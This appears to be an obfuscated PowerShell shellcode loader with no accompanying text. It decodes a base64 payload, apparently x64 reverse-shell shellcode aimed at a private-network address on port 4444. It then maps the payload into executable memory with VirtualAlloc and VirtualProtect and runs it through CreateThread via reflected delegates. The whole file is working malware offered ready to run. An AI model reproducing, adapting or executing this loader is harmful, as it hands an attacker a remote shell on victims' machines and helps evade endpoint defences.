function fV {
        Param ($rAMz, $y5)
        $kj4b8 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $kj4b8.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($kj4b8.GetMethod('GetModuleHandle')).Invoke($null, @($rAMz)))), $y5))
}

function a1Do {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $iY,
                [Parameter(Position = 1)] [Type] $gvel_ = [Void]
        )

        $q1 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $q1.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $iY).SetImplementationFlags('Runtime, Managed')
        $q1.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $gvel_, $iY).SetImplementationFlags('Runtime, Managed')

        return $q1.CreateType()
}

[Byte[]]$z1 = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSSDHSZUiLUmBRSItSGFZIi1IgSItyUE0xyUgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGESLQCBQSQHQ41ZI/8lNMclBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcwKgBDEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
[Uint32]$yZe = 0
$x14 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fV kernel32.dll VirtualAlloc), (a1Do @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $z1.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($z1, 0, $x14, $z1.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fV kernel32.dll VirtualProtect), (a1Do @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($x14, [Uint32]$z1.Length, 0x10, [Ref]$yZe)) -eq $true) {
        $iupZ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fV kernel32.dll CreateThread), (a1Do @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$x14,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fV kernel32.dll WaitForSingleObject), (a1Do @([IntPtr], [Int32]))).Invoke($iupZ,0xffffffff) | Out-Null
}
